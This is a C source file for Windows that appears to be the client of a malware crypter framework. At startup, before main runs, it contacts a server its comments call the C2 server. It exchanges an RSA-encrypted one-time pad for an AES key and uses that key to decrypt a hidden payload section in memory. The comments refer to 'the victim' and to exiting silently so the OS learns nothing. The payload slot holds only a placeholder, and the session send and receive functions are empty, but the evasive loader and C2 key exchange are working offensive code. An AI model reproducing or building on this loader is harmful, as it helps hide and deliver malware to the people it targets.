#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "cryptor.h"
#include <wincrypt.h>
#include <ws2tcpip.h>
#include <bcrypt.h>
#include <ntstatus.h>
#define PLStr(str) (BYTE[]){str}
/*
 * Session pertanate keys must be defined globaly for the constructor to initiate/ destructor to
 * destoy all keying material appropriatly. Once innitiated communication with the sever will continue
 * fur the duration of the programs execution. 
 *
 */
__attribute__((section(".payload"))) int send_secure(BYTE*,ULONG);
__attribute__((section(".payload"))) int recv_secure(BYTE*,ULONG);
BYTE* SessionIV;
BYTE* SessionKEY;
BCRYPT_KEY_HANDLE SessionKeyHandle;
/*
 * this socket is connected in the .cryptor construct function and shutdown in the .cryptor destruct function.
 */
SOCKET Connection; 

BCRYPT_KEY_HANDLE bcrypt_key_handle_rsa;



/*
 *	****************************************************************
 *	YOUR PAYLOAD GOES HERE, THIS IS WHERE YOUR DEVELOPMENT WORK WILL
 *	BEGIN. HAVE FUN
 *	****************************************************************
 *
 * 	USE PLStr to secure all your binary strings
 */
__attribute__((section(".payload"))) int payload(){
	printf(PLStr("hello world from the cryptor"));
	
}

/*
 * This Constructor is responsible for the following tasks
 * 	- Generating a One Time Pad
 * 	- RSA encrypting the generated One Time Pad
 * 	- Sending the encrypted One Time Pad to the server
 * 	- Detrieving an AES key encoded with the One Time Pad
 * 	- Decoding the AES key
 *	- Decrypting the .payload section
 * if this function is successful then a WINSOC ("Connection") will be constructed for the payload environment
 * this socket will be closed in the destructor.
 *
 * this function will also populate a handle to a BCRYPT_KEY_HANDLE for rsa encryption (" bcrypt_key_handle_rsa"), this 
 * handle will be destroyed in the destructor. 
 *
 * the Connection socket and the bcrypt_key_handle_rsa constructs will be utilized in a priority 2 constructor belonging to the 
 * .payload section to  initiate a secure_send, and secure_recieve function 
 *
 * this function is long but has a narrow focus on what is being accomplished, the outcomes of this function are used 
 * in the remainder of the program, additional conmstructors will be created with lower priority values to set up
 * cryptographically secure communication functions in the payload sections.
 *
 * Because this is the highest priority constructor in the runtime environment setup it is given priority 101, equvilant destructor priority
 * is 101.
 */
__attribute__((constructor(101), section(".cryptor"))) int construct()
{
	typedef BOOL (*CIPKIE2)(DWORD dwCertEncodingType, PCERT_PUBLIC_KEY_INFO pInfo, DWORD dwFlag, void *pvAuxInfo, BCRYPT_KEY_HANDLE *phKey);
	CIPKIE2 CryptImportPublicKeyInfoEx2;
	HMODULE CryptImport = LoadLibraryA("Crypt32.dll");
	if( CryptImport ) 
	{
	 	CryptImportPublicKeyInfoEx2 = (CIPKIE2)GetProcAddress(CryptImport,"CryptImportPublicKeyInfoEx2");
	}
	/*
	* Get the section offsets for the cryptor to decrypt the payload stub
	*/
	extern UINT64 START_OF_PAYLOAD;
	extern UINT64 END_OF_PAYLOAD;
	/*
	 * Decode the appropriate values to get the offest and the size paramaters correct
	 */
	UINT64  addr_s = (UINT64)&START_OF_PAYLOAD;
	UINT64  addr_e = (UINT64)&END_OF_PAYLOAD;
	UINT64 payload_size;
	BYTE* ptr_payload;
	/*
	 * Define vars necessary to decode the IV
	 */
	BYTE* iv = IV;
	BYTE* decodedIV;
	DWORD sz = IVLEN;
	/*
	 * define variables necessary to decode the public key
	 */
	BYTE* PemPubKey = PUBKEY; //Public key embedded in header
	PCCERT_CONTEXT pCertContext = NULL;
	BYTE* derPubKey;
	DWORD derPubKeyLen = RSAKEYLEN;
	BCRYPT_ALG_HANDLE alg;
	CERT_PUBLIC_KEY_INFO *PubKeyInfo;
	DWORD PubKeyInfoLen;
	BYTE* recvData;
	/*
	 * Define Variables required to generate a cryptographically random integer
	 */
	BCRYPT_ALG_HANDLE randNumProv;
	BYTE* OTP = CryptMemAlloc(AESKEYLEN+1);

	/* 
	 * Define variables required to store the encrypted OTP
	 */
	PUCHAR EncryptedOTP;
	ULONG EncryptedOTPLen;
	ULONG EncryptedOTPWriteLen;
	/*
	* Definitions of variables for the windows client
	*/
	WSADATA  wsaData;
	struct addrinfo *result = NULL, init = {0};
	/*
	 * 
	 */
	BYTE* key = CryptMemAlloc(AESKEYLEN+1);
	/*
	 * Define variables required to decrypt the payload stub
	 */
	BCRYPT_ALG_HANDLE decryptPayloadKeyAlg;
	BCRYPT_KEY_HANDLE decryptPayloadKey;
	ULONG PAYLOAD_WRITE_LEN;
	/*
	* retrieving the public key
	* in the event of an error silently exit 0. No reason to provide a return status to a victim
	*/
	if(!CryptStringToBinaryA(PemPubKey,0, CRYPT_STRING_ANY, NULL, &derPubKeyLen,NULL,NULL))
	{
		DWORD err = GetLastError();   
		printf("DerLen %d",derPubKeyLen);
		exit(0);
	}
	derPubKey = (BYTE*)CryptMemAlloc(derPubKeyLen);
	if(!CryptStringToBinary(PemPubKey,0, CRYPT_STRING_BASE64, derPubKey, &derPubKeyLen,NULL,NULL))
	{
		DWORD err = GetLastError();   
		printf("failed to decode pem %d",err);
		exit(0);
	}
	if(BCryptOpenAlgorithmProvider(&alg, BCRYPT_RSA_ALGORITHM,NULL,0) != STATUS_SUCCESS)
	{
		printf("failed\n");
		DWORD err = GetLastError();
		printf("Error AlgProvider: %d",err);   
		exit(0);
	}
    	if(!CryptDecodeObjectEx(X509_ASN_ENCODING, X509_PUBLIC_KEY_INFO, derPubKey,derPubKeyLen,
		    CRYPT_DECODE_ALLOC_FLAG,NULL,&PubKeyInfo,&PubKeyInfoLen))
	{
		DWORD err = GetLastError();
		printf("Error DecodeObject: %d",err);
		exit(0);
	}
	if(!CryptImportPublicKeyInfoEx2( X509_ASN_ENCODING,PubKeyInfo,0, NULL,&bcrypt_key_handle_rsa))
	{
		DWORD err = GetLastError();
		printf("Error ImportPubKeyInfo: %d",err);
		exit(0);
	}

	/*
	 * Generate a one time pad generation
	 * Generate random bytes. These bytes are sent to the server encrypted with RSA 
	 * The bytes will be XORed against the AES key used to decrypt the .payload section.
	 */

    	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
	{	
		printf ("error creating provider\n");
		exit(0);
	}
    	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(OTP), AESKEYLEN, 0)))
    	{
	printf("error generating random number");
		exit(0);
    	}
	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
	{
		printf("error closing handaler");
		exit(0);
	}
	/*
 	* Calculate the length of the buffer necessary to store the one time pad
 	*/	
	
	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(OTP), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &EncryptedOTPLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("error in calculating RSA output key length.");
		exit(0);
	}
	/*
 	* Encrypt the one time pad with the RSA key
 	*/
	EncryptedOTP = CryptMemAlloc(EncryptedOTPLen);
	if(BCryptEncrypt(bcrypt_key_handle_rsa,(OTP), AESKEYLEN, NULL,NULL,0, EncryptedOTP,  EncryptedOTPLen, &EncryptedOTPWriteLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("ERROR IN ENCRYPTING");
		exit(0);
	}
	/*
 	 *  Configure socket descriptor and set the socket IP address
 	 */
	
	if (WSAStartup(0x0202,&wsaData))
    	{
		init.ai_family = AF_INET; // IPV4 address
   		init.ai_socktype = SOCK_STREAM; //define a reliable connection
    		init.ai_protocol = IPPROTO_TCP; // tcp because it's stable
	}
	if(getaddrinfo(IPADDR_SVR,PORT_SVR,&init,&result) == INVALID_SOCKET)
        	exit(-1);

    	if((Connection = socket(result->ai_family, result->ai_socktype, result->ai_protocol))==INVALID_SOCKET)
    	{
        	freeaddrinfo(result);
        	WSACleanup();
        	exit(0);
    	}
	
	/*
	 * Attempt to connect to the C2 server to retrieve the keys necessary to decrypt
	 * the payolad section, for this to work this client transmits a OTP that has been
	 * encrypted using an RSA public key (Length defined by the Conf file, default 4096)
	 */
	if(connect(Connection,result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
     	{   
        	exit(-1);
     	}

	EncryptedOTPWriteLen = htonl(EncryptedOTPWriteLen);

	if(!send(Connection,(BYTE*)&EncryptedOTPWriteLen ,sizeof(ULONG),0))
	{
		exit(-1);
	}
	recvData = CryptMemAlloc(1);
	/*
	 * recieve a syncronizatioon byte to ensure data is recieved appropriatly. 
	 */
	if(!recv(Connection,recvData,1,0))
	{
		exit(-1);
	} 
	/*
	 * send the EncryptedOTP to the server
	 */
	EncryptedOTPWriteLen = htonl(EncryptedOTPWriteLen);
	
	if(!send(Connection,(BYTE*)EncryptedOTP,EncryptedOTPWriteLen, 0))
	{
		printf("error sending EncryptedOTP (%d bytes).",EncryptedOTPWriteLen);
		exit(-1);
	}
	/*
	 * recieve the OTP encrypted AES key from the server
	 */
	//recvData = malloc(AESKEYLEN+1);
	if(!recv(Connection,key,AESKEYLEN,0))
	{
		exit(-1);
	} 

	for( int x = 0 ; x<AESKEYLEN ; x++)
	{	
		*(key+x)^=*(OTP+x);
	}

			
	/*
	 * Decode The IV
	 * first call calculates the length, second call allocates the space, last call base64 decodes the IV.
	 */
	
	 if (!CryptStringToBinaryA(iv,0,CRYPT_STRING_ANY, NULL,&sz,NULL,NULL))
		exit(0);

	 decodedIV = CryptMemAlloc(sz+1);
	 if (!CryptStringToBinaryA(iv,0,CRYPT_STRING_ANY, decodedIV,&sz,NULL,NULL))
		exit(0);
	/*
			  * silently exit, even though we exit with error we don't
			  * give this information to the OS
			  */
	/*
	 * open the handle to the cryptograpic primitive required to decrypt the payload
	 */
	if(BCryptOpenAlgorithmProvider( &decryptPayloadKeyAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
	{
		printf ("failed to open the algorithm provider for payload decryption");
		exit (-1);
	}
	/*
	 * Set the mode for decryption to CFB, the CFB provider works for both pycryptodome and 
	 * the microsft bcrypt C cryptographic provider. 
	 */
	if(BCryptSetProperty(decryptPayloadKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
	{
		printf ("failed to set the chaining mode to CFB");
		exit(-1);
	}
	if(BCryptGenerateSymmetricKey(decryptPayloadKeyAlg,&decryptPayloadKey, 0,0,(PUCHAR)key,AESKEYLEN,0) != STATUS_SUCCESS)
	{
		printf("failed to create a BCryptKeyHandle");
		exit(-1);
	}
	
	payload_size = addr_e-addr_s;
	ptr_payload = (BYTE*)addr_s;
	if(BCryptDecrypt(decryptPayloadKey,ptr_payload,payload_size,NULL,decodedIV,sz,ptr_payload,payload_size,&PAYLOAD_WRITE_LEN,0) != STATUS_SUCCESS)
	{
			printf("failed to decrypt payload");
		exit(-1);
	}
	if(BCryptDestroyKey(decryptPayloadKey) != STATUS_SUCCESS){
		printf("Error in destroying key");
		exit(0);
	}
	CryptMemFree(OTP);
	CryptMemFree(derPubKey);
	CryptMemFree(key);
	CryptMemFree(recvData);
	CryptMemFree(decodedIV);
	CryptMemFree(EncryptedOTP); 
	/*
	 * gotta do some clean up here
	 */
	return 0;
}

__attribute__((destructor(101),section(".cryptor"))) int destruct(){
	/*
	 * close the WINSOC innitiated in the construct function
	 */
	closesocket(Connection);
	/*
 	* destroy are public key in a sane manner
 	*/
	
	if(BCryptDestroyKey( bcrypt_key_handle_rsa) != STATUS_SUCCESS){
		printf("Error in destroying key");
		exit(0);
	}
	
	return 0;
}
/*
 * This function will be used to generate a random IV, and a random AES key 
 * to act as the session key for the duration of the runtime. this will enable
 * developers to use the payload section to send data to, and recieve data from
 * the server in an efficient manner.
 */
__attribute__((constructor(102), section(".payload"))) int InitSecureComs(){
	/*
	 * Allocate space for the IV and key
	 */
	SessionIV = CryptMemAlloc(AESKEYLEN);
	SessionKEY = CryptMemAlloc(AESKEYLEN);
	/*
	 * Define a algorithm handle for a cryptographically secure 
	 * random number generater.
	 */
	BCRYPT_ALG_HANDLE randNumProv;
	BCRYPT_ALG_HANDLE SessionKeyAlg;

	/*
	 * define a buffer to store the AES key once it has been encrypted with the RSA public key
	 */
	PUCHAR encryptedSessionKey;
	ULONG encryptedSessionKeyLen;
	ULONG encryptedSessionKeyWrittenLen;
	BYTE* Syncronization = CryptMemAlloc(1);
	/*
	 * open a handle for the cryptographic service provider generate the IV and AES key then close
	 * the cryptographic storage provider.
	 */
	if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&randNumProv, BCRYPT_RNG_ALGORITHM, NULL, 0)))
	{	
		printf ("error creating provider\n");
		exit(0);
	}
	
	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionIV), AESKEYLEN, 0)))
	{
		printf("error generating random number");
		exit(0);
	}
	
	if (!BCRYPT_SUCCESS(BCryptGenRandom(randNumProv, (PUCHAR)(SessionKEY), AESKEYLEN, 0)))
	{
		printf("error generating random number");
		exit(0);
	}
	 
	if(!BCRYPT_SUCCESS(BCryptCloseAlgorithmProvider(randNumProv, 0)))
	{
		printf("error closing handaler");
		exit(0);
	}
	/*
	 * Initiate the  SessionKeyHandle;
	 */
	if(BCryptOpenAlgorithmProvider( &SessionKeyAlg, BCRYPT_AES_ALGORITHM, NULL, 0) != STATUS_SUCCESS)
	{
		printf ("failed to open the algorithm provider for payload decryption");
		exit (-1);
	}
	/*
	 * Set the mode for decryption to CFB, the CFB provider works for both pycryptodome and 
	 * the microsft bcrypt C cryptographic provider. 
	 */
	if(BCryptSetProperty(SessionKeyAlg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_CFB,sizeof(BCRYPT_CHAIN_MODE_CFB),0) != STATUS_SUCCESS)
	{
		printf ("failed to set the chaining mode to CFB");
		exit(-1);
	}
	if(BCryptGenerateSymmetricKey(SessionKeyAlg,&SessionKeyHandle, 0,0,(PUCHAR)SessionKEY,AESKEYLEN,0) != STATUS_SUCCESS)
	{
		printf("failed to create a BCryptKeyHandle");
		exit(-1);
	}
	/*
 	* Calculate the length of the buffer necessary to store the Session key
 	*/	
	
	if(BCryptEncrypt( bcrypt_key_handle_rsa,(PUCHAR)(SessionKEY), AESKEYLEN, NULL,NULL,0, NULL,0/* Ignored because pbOutput is null*/, &encryptedSessionKeyLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("error in calculating RSA output key length.");
		exit(0);
	}
	/*
 	* Encrypt the Session key with the RSA key
 	*/
	encryptedSessionKey = CryptMemAlloc(encryptedSessionKeyLen);
	if(BCryptEncrypt(bcrypt_key_handle_rsa,(SessionKEY), AESKEYLEN, NULL,NULL,0, encryptedSessionKey, encryptedSessionKeyLen, &encryptedSessionKeyWrittenLen,BCRYPT_PAD_PKCS1) != STATUS_SUCCESS)
	{
		printf("ERROR IN ENCRYPTING");
		exit(0);
	}
	/*
	 * Fix the network order of the encryptedSessionKeyWrittenLen.
	 */
	encryptedSessionKeyWrittenLen = htonl(encryptedSessionKeyWrittenLen);
	/*
	 * Send the length of the encrypted AES key to the server.
	 */
	if(!send(Connection,(BYTE*)&encryptedSessionKeyWrittenLen,sizeof(ULONG),0))
	{
		exit(-1);
	}
	/*
	 * Recieve a syncronization byte from the server
	 */
	if(!recv(Connection,Syncronization,1,0))
	{
		exit(-1);
	}
	/*
	 * Send the encrypted session key to the server
	 */
	if(!send(Connection,(BYTE*)encryptedSessionKey, ntohl(encryptedSessionKeyWrittenLen),0))
	{
		exit(-1);
	}
	/*
	 * Recieve a syncronization byte from the server
	 */
	if(!recv(Connection,Syncronization,1,0))
	{
		exit(-1);
	}
	CryptMemFree(Syncronization);
	CryptMemFree(encryptedSessionKey);
}

/*
 * destroys the session keys created for this session.
 */
__attribute__((destructor(102), section(".payload"))) int closeSecureComs(){
	/* 
	 *Destroy the BCrypt key handle
	 */
	if(BCryptDestroyKey(SessionKeyHandle) != STATUS_SUCCESS){
		printf("wtf Error in destroying key");
		exit(0);
	}
	
	CryptMemFree(SessionIV);
	CryptMemFree(SessionKEY);


}
/*
 * this function takes a pointer to a  buffer to be sent as well as the length of the buffer.
 * this function will return true if this function succeeds.
 */
__attribute__((section(".payload"))) int send_secure(BYTE* sendBuffer, ULONG bufferLen){

}
__attribute__((section(".payload"))) int recv_secure(BYTE* recvBuffer, ULONG bufferLen){

}




int  main()
{
return payload();
}
